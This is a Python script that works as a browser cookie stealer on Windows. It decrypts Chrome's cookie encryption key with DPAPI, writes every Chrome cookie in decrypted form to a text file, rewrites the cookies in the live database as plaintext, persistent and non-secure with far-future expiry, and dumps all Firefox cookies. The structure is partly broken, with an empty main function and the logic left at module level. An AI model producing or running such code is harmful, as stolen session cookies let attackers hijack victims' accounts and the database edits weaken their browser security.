import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt 
from Crypto.Cipher import AES 

def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def main():
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Cookies")

    filename = "Cookies.db"


appdata = os.getenv("appdata").replace("\\Roaming","")
filename = appdata + "\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
db = sqlite3.connect(filename)
cursor = db.cursor()
db.text_factory = bytes


cursor.execute("""
SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
FROM cookies""")


key = get_encryption_key()
for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
    if not value:
        decrypted_value = decrypt_data(encrypted_value, key)
    else:
        decrypted_value = value
    with open('cookie.txt','a') as f:
        f.write(f"""
    Host: {host_key}
    Cookie name: {name}
    Cookie value (decrypted): {decrypted_value}
    Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
    Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
    Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
    ===============================================================
    """)

    cursor.execute("""
    UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
    WHERE host_key = ?
    AND name = ?""", (decrypted_value, host_key, name))
db.commit()

db.close()

appdata = os.getenv("appdata").replace("\\Roaming","")

alldir = appdata + "\\Roaming\\Mozilla\\Firefox\\Profiles"
try:
    for subdir, dirs, files in os.walk(alldir):
        for file in files:
            if file == 'cookies.sqlite':
                mozcooki=os.path.join(subdir, file)
                db = sqlite3.connect(mozcooki)
                cursor = db.cursor()
                cursor.execute("""SELECT * FROM moz_cookies""")
                with open('mozcookie.txt','a') as f:
                    f.write(str(cursor.fetchall()))
except:
    pass
    #no mozilla

if __name__ == "__main__":
    main()